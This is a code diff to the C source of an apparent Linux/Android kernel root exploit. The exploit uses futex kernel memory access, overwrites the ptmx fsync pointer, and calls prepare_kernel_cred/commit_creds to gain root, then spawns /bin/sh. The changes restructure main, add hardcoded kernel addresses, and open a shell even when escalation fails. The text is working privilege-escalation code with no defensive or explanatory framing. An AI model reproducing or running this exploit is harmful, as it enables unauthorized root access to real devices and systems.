@@ -12,10 +12,10 @@
 #include <fcntl.h>
 #include <signal.h>
 #include "futex.h"
-#include "exploit_utils.h"
 #include "crusty.h"
 #include "cred.h"
 #include "ptmx.h"
+#include "exploit_utils.h"
 
 #define THREAD_SIZE             8192
 
@@ -36,6 +36,7 @@ struct kernel_cap_struct;
 struct task_security_struct;
 struct list_head;
 
+#if 0
 struct kernel_cap_struct {
   unsigned long cap[2];
 };
@@ -85,6 +86,7 @@ struct task_struct_partial {
   struct cred *replacement_session_keyring;
   char comm[16];
 };
+#endif
 
 typedef struct _callback_info_t {
   exploit_callback_t func;
@@ -277,37 +279,20 @@ attempt_exploit(unsigned long int address,
 
 static bool
 run_exploit(void)
-{    
-    printf("prepare_kernel_cred: 0x%08x, commit_creds: 0x%08x, ptmx_fops_fsync_address: 0x%08x\n",
-        (void *)prepare_kernel_cred,
-        (void *)commit_creds,
-        (void *)ptmx_fops_fsync_address);
-    
+{        
     setup_ptmx_fops_fsync_address();
     if (!ptmx_fops_fsync_address) {
         return false;
     }
+    
+    printf("prepare_kernel_cred: 0x%08x, commit_creds: 0x%08x, ptmx_fops_fsync_address: 0x%08x\n",
+        (void *)prepare_kernel_cred,
+        (void *)commit_creds,
+        (void *)ptmx_fops_fsync_address);
 
     return attempt_exploit(ptmx_fops_fsync_address,
                          (unsigned long int)&obtain_root_privilege, 0,
                          run_obtain_root_privilege, NULL);
-}
-
-void futex_root_test() 
-{
-    unsigned char buf[4];
-    int i;
-    printf("[%s]futex_read_values_at_address.\n", __FUNCTION__);
-    futex_read_values_at_address(0xC0000000, (int *)buf, sizeof(buf));
-    printf("[%s]futex_read_values_at_address called.\n", __FUNCTION__);
-    for(i = 0; i < sizeof(buf); i++) {
-        printf("%02x, ", buf[i]);
-    }
-    printf("\n");
-    printf("[%s]infinite loop.\n", __FUNCTION__);
-    while(1) {
-        sleep(1);
-    }    
 }
 
 bool
@@ -316,6 +301,8 @@ setup_variables(void)
     //prepare_kernel_cred = 0xc104f480;
     //commit_creds = 0xc104f200;
     ptmx_fops = 0xc1ab3180;
+    //ptmx_fops = 0xc1bc78c0;
+    //ptmx_fops = 0xc1aeeda0;
     
   setup_prepare_kernel_cred_address();
   setup_commit_creds_address();
@@ -340,23 +327,48 @@ setup_variables(void)
   return false;
 }
 
-int main(int argc, char *argv[])
+void futex_root_test() 
+{
+    unsigned char buf[4];
+    int i;
+    printf("[%s]futex_read_values_at_address.\n", __FUNCTION__);
+    futex_read_values_at_address(0xC0000000, (int *)buf, sizeof(buf));
+    printf("[%s]futex_read_values_at_address called.\n", __FUNCTION__);
+    for(i = 0; i < sizeof(buf); i++) {
+        printf("%02x, ", buf[i]);
+    }
+    printf("\n");
+    printf("[%s]infinite loop.\n", __FUNCTION__);
+    while(1) {
+        sleep(1);
+    }    
+}
+
+void root_with_server()
 {    
     printf("sizeof(unsigned long int): %d.\n", sizeof(unsigned long int));
-    //futex_root_test();
     if (!setup_variables()) {
         printf("Failed to setup variables.\n");
         exit(EXIT_FAILURE);
     }
     
     run_exploit();
-
+    
     if (getuid() != 0) {
         printf("Failed to obtain root privilege.\n");
+        system("/bin/sh");
         exit(EXIT_FAILURE);
     }
     
     printf("execute system shell.\n");
     system("/bin/sh");
     exit(EXIT_SUCCESS);
+}
+
+int main(int argc, char *argv[])
+{
+    printf("[%s]enter\n", __FUNCTION__);
+    //root_with_server();
+    futex_exploit_main();
+    printf("[%s]leave\n", __FUNCTION__);
 }
